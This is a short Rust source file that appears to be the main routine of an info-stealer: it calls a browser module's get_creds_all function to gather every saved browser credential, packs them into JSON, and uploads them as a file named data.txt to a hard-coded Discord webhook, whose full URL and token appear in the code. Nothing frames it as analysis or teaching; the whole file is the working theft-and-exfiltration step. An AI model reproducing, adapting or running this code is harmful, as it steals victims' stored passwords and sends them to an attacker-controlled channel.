mod browser;

use serde_json;
use reqwest;

use browser::get_creds_all;

fn main() {

    const WEBHOOK: &str = "https://discord.com/api/webhooks/1205587694160449626/F4o8kDxAQpEdx2IiumVGLzgekIVSLU8jPMjKuFD1dTCNdPogGZzqpZ7PwLg4HAmxb9Jp";

    let pass = get_creds_all().unwrap_or(Vec::new());
    let data = serde_json::json!({
        "pass": pass
    });

    let client = reqwest::blocking::Client::new();
    let request = format!(r#"--boundary
Content-Disposition: form-data; name="payload_json"
Content-Type: application/json

{{"content": "Hi!"}}
--boundary
Content-Disposition: form-data; name="file0"; filename="data.txt"
Content-Type: text/plain

{}
--boundary--"#, serde_json::to_string(&data).unwrap_or("".to_owned()));
    let _ = client.post(WEBHOOK).header(reqwest::header::CONTENT_TYPE, "multipart/form-data; boundary=boundary").body(request).send();
}
